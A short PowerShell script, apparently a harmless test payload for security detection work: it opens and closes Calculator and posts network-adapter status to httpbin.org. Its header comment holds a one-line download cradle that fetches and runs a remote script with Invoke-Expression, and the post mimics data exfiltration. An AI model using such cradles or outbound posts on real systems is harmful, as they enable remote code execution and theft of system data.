## to be executed as; powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kaywoz/bluestuff/main/powershell/Payload-nonsense.ps1')"

##pop calc
calc.exe
sleep 5
## kill calc
get-process *calc* | stop-process

## gather netadapter state and post to https://httpbin.org/post which returns POST data.
$postParams = (Get-NetAdapter | select status | findstr Up)
Invoke-WebRequest -Uri https://httpbin.org/post -Method POST -Body $postParams -ErrorAction SilentlyContinue
